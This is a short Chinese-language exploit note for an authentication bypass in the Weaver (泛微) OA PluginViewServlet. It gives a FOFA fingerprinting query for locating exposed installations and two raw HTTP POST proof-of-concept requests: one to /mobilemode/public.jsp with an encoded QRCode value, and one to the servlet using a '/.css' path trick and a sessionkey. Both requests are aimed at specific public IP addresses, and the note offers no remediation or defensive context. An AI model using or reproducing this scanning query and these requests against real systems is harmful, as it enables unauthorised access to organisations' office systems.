# 泛微OA办公系统 PluginViewServlet 认证绕过漏洞

    ## fofa

```
(header="testBanCookie" || banner="testBanCookie" || body="/wui/common/css/w7OVFont.css" || (body="typeof poppedWindow" && body="client/jquery.client_wev8.js") || body="/theme/ecology8/jquery/js/zDialog_wev8.js" || body="ecology8/lang/weaver_lang_7_wev8.js")
```



## poc

```
POST /mobilemode/public.jsp HTTP/1.1
Host: 183.240.31.87
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 80

from=QRCode&url=CC4DFA20F3CF7CF61F86C43FA6A84C7020E42052CDB6847AEF9362D0FA570CB7
```

```
POST /weaver/weaver.mobile.plugin.ecology.service.PluginViewServlet/.css HTTP/1.1
Host: 183.230.46.191
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 47

sessionkey=c332c050-2c22-4bd2-a648-87afd0a58387
```
